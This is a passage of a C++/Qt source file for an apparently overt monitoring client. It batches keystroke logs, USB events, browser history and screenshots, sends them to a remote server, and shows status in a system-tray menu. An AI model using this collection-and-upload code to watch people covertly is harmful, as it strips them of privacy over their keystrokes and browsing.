                QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
                ret = sendDataChunk(serverIP, serverPort, "KeyLog", "KeyLogs", chunkJsonString);
                
                if (ret == 1) {
                    // Success - update last sent time
                    lastKeySentTime = QDateTime::currentDateTime();
                    updateStatusDisplay();
                } else {
                    qDebug() << "Failed to send key log chunk" << (i + 1);
                    break;
                }
                
                // Small delay between chunks to avoid overwhelming the server
                QThread::msleep(100);
            }
            
            keyLogs.clear();  // Clear logs after sending
        }
    } else {
        qDebug() << "No key logs to send";
        ret = 1; // Success (no data to send)
    }
    return ret;
}

int MonitorClient::sendUSBLogs()
{
    int ret = -3;
    if (!usbLogs.isEmpty()) {
        qDebug() << "Sending USB logs in chunks...";
        
        QString serverIP = getServerIP();
        int serverPort = getServerPort();
        if (!serverIP.isEmpty() && serverPort > 0) {
            // Split into chunks of 1000 entries
            QList<QList<QJsonObject>> chunks = chunkData(usbLogs, 1000);
            
            qDebug() << "Sending" << chunks.size() << "chunks of USB logs";
            
            // Send each chunk
            for (int i = 0; i < chunks.size(); ++i) {
                qDebug() << "Sending USB log chunk" << (i + 1) << "of" << chunks.size();
                QString chunkJsonString = getJsonObjectListAsJsonString(chunks[i]);
                ret = sendDataChunk(serverIP, serverPort, "USBLog", "USBLogs", chunkJsonString);
                
                if (ret == 1) {
                    // Success - update last sent time
                    lastUsbSentTime = QDateTime::currentDateTime();
                    updateStatusDisplay();
                } else {
                    qDebug() << "Failed to send USB log chunk" << (i + 1);
                    break;
                }
                
                // Small delay between chunks to avoid overwhelming the server
                QThread::msleep(100);
            }
            
            usbLogs.clear();  // Clear logs after sending
        }
    } else {
        qDebug() << "No USB logs to send";
        ret = 1; // Success (no data to send)
    }
    return ret;
}

void MonitorClient::getVivaldiHistory() {
    QStringList profilePaths = getChromiumBasedProfilePaths("/.config/vivaldi/");
    
    for (const QString& dbPath : profilePaths) {
        if (!dbPath.isEmpty()) {
            QString query = "SELECT datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url AS url, visit_time "
                           "FROM urls, visits WHERE visits.url = urls.id";
            queryBrowserHistory(dbPath, query, "Vivaldi");
        }
    }
}

QList<QList<QJsonObject>> MonitorClient::chunkData(const QList<QJsonObject>& data, int chunkSize) {
    QList<QList<QJsonObject>> chunks;
    for (int i = 0; i < data.size(); i += chunkSize) {
        QList<QJsonObject> chunk;
        for (int j = i; j < i + chunkSize && j < data.size(); j++) {
            chunk.append(data[j]);
        }
        chunks.append(chunk);
    }
    return chunks;
}

int MonitorClient::sendDataChunk(const QString& serverIP, int serverPort, const QString& eventType, const QString& dataField, const QString& data) {
    QEventLoop eventLoop;
    QNetworkAccessManager mgr;
    QObject::connect(&mgr, SIGNAL(finished(QNetworkReply*)), &eventLoop, SLOT(quit()));

    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
    QNetworkRequest req;
    req.setUrl(QUrl(url));
    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    
    // Create JSON object
    QJsonObject jsonObj;
    jsonObj["MacAddress"] = macAddress;
    jsonObj["Event"] = eventType;
    jsonObj["Version"] = QString(MONITORAPP_VERSION);
    jsonObj["Username"] = clientName;
    
    // Parse the data string back into JSON array
    QJsonParseError parseError;
    QJsonDocument dataDoc = QJsonDocument::fromJson(data.toUtf8(), &parseError);
    if (parseError.error == QJsonParseError::NoError && dataDoc.isArray()) {
        jsonObj[dataField] = dataDoc.array();
    } else {
        qDebug() << "Failed to parse data as JSON array:" << parseError.errorString();
        jsonObj[dataField] = data;  // Fallback to string if parsing fails
    }
    
    QJsonDocument jsonDoc(jsonObj);
    QByteArray jsonData = jsonDoc.toJson();
    
    QNetworkReply *reply = mgr.post(req, jsonData);
    eventLoop.exec();

    int ret = -3;
    if (reply->error() == QNetworkReply::NoError) {
        // Check HTTP status code
        int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
        if (statusCode == 200) {
            ret = 1; // Success
        } else {
            qDebug() << "Server returned status code:" << statusCode;
            ret = -1; // Server error
        }
    } else {
        qDebug() << "Failure" << reply->errorString();
    }
    
    delete reply;
    return ret;
}

bool MonitorClient::isInterruptionRequested()
{
    // Stub implementation - always return false for now
    return false;
}

bool MonitorClient::testAPIEndpoints(const QString& serverIP, int serverPort)
{
    qDebug() << "=== Testing API Endpoints ===";
    
    QStringList endpoints = {"/eventhandler.php", "/webapi.php"};
    
    for (const QString& endpoint : endpoints) {
        QString url = QString("http://%1:%2%3").arg(serverIP).arg(serverPort).arg(endpoint);
        qDebug() << "Testing endpoint:" << url;
        
        QNetworkRequest request(url);
        request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
        
        QJsonObject testData;
        testData["Event"] = "Tic";
        testData["Version"] = MONITORAPP_VERSION;
        testData["MacAddress"] = macAddress;
        testData["Username"] = clientName;
        
        QJsonDocument doc(testData);
        QByteArray data = doc.toJson();
        
        QNetworkReply *reply = networkManager->post(request, data);
        
        QEventLoop loop;
        connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
        loop.exec();
        
        int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
        QString response = reply->readAll();
        
        qDebug() << "  Endpoint:" << endpoint;
        qDebug() << "  Status:" << statusCode;
        qDebug() << "  Response:" << response;
        qDebug() << "  Error:" << reply->errorString();
        
        reply->deleteLater();
        
        if (reply->error() == QNetworkReply::NoError && statusCode == 200) {
            qDebug() << "  ✓ Endpoint" << endpoint << "is working";
            return true;
        } else {
            qDebug() << "  ✗ Endpoint" << endpoint << "failed";
        }
    }
    
    return false;
}

int MonitorClient::checkActiveScreen()
{
    // Stub implementation - return 1 to indicate screen is active
    return 1;
}

// System tray implementation
void MonitorClient::setupSystemTray()
{
    // Create system tray icon
    trayIcon = new QSystemTrayIcon(this);
    trayIcon->setIcon(QIcon::fromTheme("monitor", QIcon::fromTheme("computer")));
    trayIcon->setToolTip("MonitorClient - System Monitoring");
    
    // Create tray menu
    trayMenu = new QMenu();
    
    // Create menu actions
    statusAction = new QAction("Status: Disconnected", this);
    statusAction->setEnabled(false);
    
    screenshotAction = new QAction("Take Screenshot", this);
    configureAction = new QAction("Configure...", this);
    testConnectionAction = new QAction("Test Connection", this);
    testAPIEndpointsAction = new QAction("Test API Endpoints", this);
    sendAllAction = new QAction("Send All Data", this);
    
    // Add actions to menu
    trayMenu->addAction(statusAction);
    trayMenu->addSeparator();
    trayMenu->addAction(screenshotAction);
    trayMenu->addAction(configureAction);
    trayMenu->addAction(testConnectionAction);
    trayMenu->addAction(testAPIEndpointsAction);
    trayMenu->addSeparator();
    trayMenu->addAction(sendAllAction);
    
    // Set menu for tray icon
    trayIcon->setContextMenu(trayMenu);
    
    // Connect signals
    connect(trayIcon, &QSystemTrayIcon::activated, this, &MonitorClient::onTrayIconActivated);
    connect(sendAllAction, &QAction::triggered, this, &MonitorClient::onSendAllAction);
    connect(configureAction, &QAction::triggered, this, &MonitorClient::onConfigureAction);
    connect(screenshotAction, &QAction::triggered, this, &MonitorClient::onTakeScreenshotAction);
    connect(testConnectionAction, &QAction::triggered, this, &MonitorClient::onTestConnectionAction);
    connect(testAPIEndpointsAction, &QAction::triggered, this, &MonitorClient::onTestAPIEndpointsAction);
    
    // Show tray icon
    trayIcon->show();
    
    // Force initial update
    updateTrayMenu();
    
    qDebug() << "System tray setup completed";
}

void MonitorClient::cleanupSystemTray()
{
    if (trayIcon) {
        trayIcon->hide();
        delete trayIcon;
        trayIcon = nullptr;
    }
    
    if (trayMenu) {
        delete trayMenu;
        trayMenu = nullptr;
    }
}

void MonitorClient::updateTrayIcon()
{
    if (!trayIcon) return;
    
    if (serverConnected) {
        trayIcon->setIcon(QIcon::fromTheme("emblem-ok", QIcon::fromTheme("computer")));
        trayIcon->setToolTip("MonitorClient - Connected");
    } else {
        trayIcon->setIcon(QIcon::fromTheme("emblem-error", QIcon::fromTheme("computer")));
        trayIcon->setToolTip("MonitorClient - Disconnected");
    }
}

void MonitorClient::updateTrayMenu()
{
    // Ensure tray menu is properly initialized
    if (!statusAction || !trayMenu) {
        qDebug() << "Tray menu not properly initialized, reinitializing...";
        setupSystemTray();
        return;
    }
    
    QString statusText = "=== MonitorClient Info ===\n";
    
    // Server information
    statusText += QString("Server: %1:%2\n").arg(getServerIP()).arg(getServerPort());
    
    // Client information
    statusText += QString("Client: %1\n").arg(clientName);
    statusText += QString("Local IP: %1\n").arg(getLocalIPAddress());
    statusText += QString("MAC: %1\n").arg(macAddress);
    
    // Connection status
    if (serverConnected) {
        statusText += "Status: Connected\n";
    } else {
        statusText += "Status: Disconnected\n";
        if (!lastError.isEmpty()) {
            statusText += QString("Error: %1\n").arg(lastError);
        }
    }
    
    statusText += "\n=== Last Sent Times ===\n";
    statusText += QString("Screenshot: %1\n").arg(formatLastSentTime(lastScreenshotSentTime));
    statusText += QString("Keylog: %1\n").arg(formatLastSentTime(lastKeySentTime));
    statusText += QString("Browser History: %1\n").arg(formatLastSentTime(lastBrowserSentTime));
    statusText += QString("USB Logs: %1\n").arg(formatLastSentTime(lastUsbSentTime));
    
    statusText += "\n=== Monitoring Status ===\n";
    statusText += QString("Screenshot: %1\n").arg(screenshotEnabled ? "Enabled" : "Disabled");
    statusText += QString("Keylog: %1\n").arg(keylogEnabled ? "Enabled" : "Disabled");
    statusText += QString("Browser History: %1\n").arg(browserHistoryEnabled ? "Enabled" : "Disabled");
    statusText += QString("USB Monitoring: %1").arg(usbMonitoringEnabled ? "Enabled" : "Disabled");
    
    statusAction->setText(statusText);
}

void MonitorClient::showConnectionError(const QString& error)
{
    lastError = error;
    serverConnected = false;
    
    // Update tray
    updateTrayIcon();
    updateTrayMenu();
    
    // Show notification only for first error
    if (trayIcon && !connectionErrorNotified) {
        trayIcon->showMessage("Connection Error", error, QSystemTrayIcon::Warning, 5000);
        connectionErrorNotified = true;
    }
    
    qDebug() << "Connection error:" << error;
}

bool MonitorClient::testServerConnection()
{
    QString serverIP = getServerIP();
    int serverPort = getServerPort();
    QString url = QString("http://%1:%2/eventhandler.php").arg(serverIP).arg(serverPort);
    
    qDebug() << "Testing server connection to:" << url;
    qDebug() << "Server IP:" << serverIP << "Port:" << serverPort;
    
    // First test basic connectivity
    if (!testBasicConnectivity(serverIP, serverPort)) {
        qDebug() << "Basic connectivity test failed - server may be unreachable";
        serverConnected = false;
        lastError = "Server unreachable - check network/firewall";
        showConnectionError(lastError);
        return false;
    }
    
    // Test API endpoints
    if (!testAPIEndpoints(serverIP, serverPort)) {
        qDebug() << "API endpoints test failed - server may not be responding correctly";
        serverConnected = false;
        lastError = "API endpoints not responding correctly";
        showConnectionError(lastError);
        return false;
    }
    
    QJsonObject pingData;
    pingData["Event"] = "Tic";
    pingData["Version"] = MONITORAPP_VERSION;
    pingData["MacAddress"] = macAddress;
    pingData["Username"] = clientName;
    
    QJsonDocument doc(pingData);
    QByteArray data = doc.toJson();
    
    qDebug() << "Sending ping data:" << data;
    qDebug() << "Request URL:" << url;
    
    QNetworkRequest request(url);
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    
    qDebug() << "Request Content-Type:" << request.header(QNetworkRequest::ContentTypeHeader);
    
    QNetworkReply *reply = networkManager->post(request, data);
    
    QEventLoop loop;
    connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
    loop.exec();
    
    bool success = (reply->error() == QNetworkReply::NoError);
    int statusCode = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
    
    qDebug() << "Connection test result:";
    qDebug() << "  Network error:" << reply->error();
    qDebug() << "  HTTP status code:" << statusCode;
    qDebug() << "  Response:" << reply->readAll();
    
    if (success && statusCode == 200) {
        serverConnected = true;
        lastError = "";
        connectionErrorNotified = false; // Reset error notification flag
        updateTrayIcon();
        updateTrayMenu();
        qDebug() << "Server connection successful";
    } else {
        serverConnected = false;
        QString errorMsg = reply->errorString();
        if (statusCode != 200) {
            errorMsg = QString("HTTP %1: %2").arg(statusCode).arg(errorMsg);
        }
        lastError = errorMsg;
        showConnectionError(lastError);
        qDebug() << "Server connection failed:" << errorMsg;
    }
    
    reply->deleteLater();
    return success && statusCode == 200;
}

void MonitorClient::onTrayIconActivated(QSystemTrayIcon::ActivationReason reason)
{
    if (reason == QSystemTrayIcon::DoubleClick) {
        // Double click to test connection
        testServerConnection();
    }
}



void MonitorClient::onSendAllAction()
{
    qDebug() << "Send all data requested from system tray";
    
    if (trayIcon) {
        trayIcon->showMessage("Send All Data", "Collecting and sending all data...", QSystemTrayIcon::Information, 2000);
    }
    
    // First, collect fresh data
    getBrowserHistory();
    
    // Then emit all signals to send data
    emit screen();
    emit tic();
    emit browserHistory();
    emit keyLog();
    emit usbLog();
    
    // Update status after sending
    QTimer::singleShot(2000, this, [this]() {
        updateStatusDisplay();
        if (trayIcon) {
            trayIcon->showMessage("Send All Data", "All data sent successfully!", QSystemTrayIcon::Information, 3000);
        }
    });
}

void MonitorClient::onConfigureAction()
{
    qDebug() << "Configuration dialog requested from system tray";
    
    ConfigDialog dialog;
    if (dialog.exec() == QDialog::Accepted) {
        // Reload settings
        clientName = dialog.getClientName();
        updateTrayMenu();
        
        // Test connection with new settings
        testServerConnection();
        
        if (trayIcon) {
            trayIcon->showMessage("Configuration", "Settings saved successfully!", QSystemTrayIcon::Information, 3000);
        }
    }
}

void MonitorClient::onTakeScreenshotAction()
{
    qDebug() << "Screenshot requested from system tray";
    emit screen();
    
    if (trayIcon) {
        trayIcon->showMessage("Screenshot", "Screenshot taken and sent to server", QSystemTrayIcon::Information, 3000);
    }
}

void MonitorClient::updateStatusDisplay()
{
    updateTrayIcon();
    updateTrayMenu();
}

void MonitorClient::enableScreenshot(bool enabled)
{
    screenshotEnabled = enabled;
    updateStatusDisplay();
}

void MonitorClient::enableKeylog(bool enabled)
{
    keylogEnabled = enabled;
    updateStatusDisplay();
}

void MonitorClient::enableBrowserHistory(bool enabled)
{
    browserHistoryEnabled = enabled;
    updateStatusDisplay();
}

void MonitorClient::enableUsbMonitoring(bool enabled)
{
    usbMonitoringEnabled = enabled;
    updateStatusDisplay();
}

void MonitorClient::onTestConnectionAction()
{
    qDebug() << "Manual connection test requested from system tray";
    
    if (trayIcon) {
        trayIcon->showMessage("Connection Test", "Testing server connection...", QSystemTrayIcon::Information, 2000);
    }
    
    bool success = testServerConnection();
    
    if (trayIcon) {
        if (success) {
            trayIcon->showMessage("Connection Test", "Server connection successful!", QSystemTrayIcon::Information, 3000);
        } else {
            trayIcon->showMessage("Connection Test", "Server connection failed: " + lastError, QSystemTrayIcon::Warning, 5000);
        }
    }
}

void MonitorClient::onTestAPIEndpointsAction()
{
    qDebug() << "API endpoints test requested from system tray";
    
    if (trayIcon) {
        trayIcon->showMessage("API Test", "Testing API endpoints...", QSystemTrayIcon::Information, 2000);
    }
    
    QString serverIP = getServerIP();
    int serverPort = getServerPort();
    
    bool success = testAPIEndpoints(serverIP, serverPort);
    
    if (trayIcon) {
        if (success) {
            trayIcon->showMessage("API Test", "API endpoints are working!", QSystemTrayIcon::Information, 3000);
        } else {
            trayIcon->showMessage("API Test", "API endpoints failed - check server", QSystemTrayIcon::Warning, 5000);
        }
    }
}

QString MonitorClient::formatLastSentTime(const QDateTime& time)
{
    if (!time.isValid()) {
        return "Never";
    }
    
    QDateTime now = QDateTime::currentDateTime();
    qint64 seconds = time.secsTo(now);
    
    if (seconds < 60) {
        return QString("%1s ago").arg(seconds);
    } else if (seconds < 3600) {
        return QString("%1m ago").arg(seconds / 60);
    } else if (seconds < 86400) {
        return QString("%1h ago").arg(seconds / 3600);
    } else {
        return time.toString("MM/dd HH:mm");
    }
}

QString MonitorClient::getLocalIPAddress()
{
    QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    
    for (const QNetworkInterface& interface : interfaces) {
        // Skip loopback and down interfaces
        if (interface.flags().testFlag(QNetworkInterface::IsLoopBack) ||
            !interface.flags().testFlag(QNetworkInterface::IsUp)) {
            continue;
        }
        
        QList<QNetworkAddressEntry> entries = interface.addressEntries();
        for (const QNetworkAddressEntry& entry : entries) {
            QHostAddress addr = entry.ip();
            if (addr.protocol() == QAbstractSocket::IPv4Protocol && 
                !addr.toString().startsWith("169.254")) { // Skip link-local addresses
                return addr.toString();
            }
        }
    }
    
    return "Unknown";
}

bool MonitorClient::testBasicConnectivity(const QString& host, int port)
{
    QTcpSocket socket;
    socket.connectToHost(host, port);
    
    if (socket.waitForConnected(5000)) {
        qDebug() << "Basic connectivity test successful to" << host << ":" << port;
        socket.disconnectFromHost();
        return true;
    } else {
        qDebug() << "Basic connectivity test failed to" << host << ":" << port;
        qDebug() << "Socket error:" << socket.errorString();
        return false;
    }
}
